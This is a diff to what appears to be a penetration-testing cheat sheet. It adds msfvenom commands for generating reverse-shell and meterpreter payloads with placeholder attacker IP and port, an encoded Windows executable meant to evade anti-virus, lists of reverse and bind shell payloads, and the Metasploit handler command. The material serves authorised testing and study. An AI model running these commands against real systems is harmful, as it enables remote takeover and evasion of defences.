@@ -30,6 +30,46 @@ https://github.com/AlessandroZ/BeRoot
 https://github.com/pentestmonkey/unix-privesc-check  
 https://github.com/sleventyeleven/linuxprivchecker  
 
+## msfvenom
+```
+msfvenom -l payloads
+msfvenom -l formats
+```
+Generate a payload
+```
+msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker PORT> -f <format> -o <output payload file name>
+```
+This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.
+```
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+```
+Comon payloads
+- Meterpreter
+```
+linux/x86/meterpreter/reverse_tcp
+linux/x64/meterpreter/reverse_tcp
+windows/meterpreter/reverse_tcp
+windows/x64/meterpreter/reverse_tcp
+```
+- Staged (x86 in the list)
+```
+linux/x86/shell/bind_tcp
+linux/x86/shell/reverse_tcp
+windows/shell/bind_tcp
+windows/shell/reverce_tcp
+```
+- Stageless (x86 in the list) (The most compact payloads)
+```
+linux/x86/shell_reverse_tcp
+linux/x86/shell_bind_tcp
+windows/shell_bind_tcp
+windows/shell_reverse_tcp
+```
+Multi Handler
+```
+use exploit/multi/handler
+```
+
 ## Gobuster
 https://github.com/OJ/gobuster
 ```
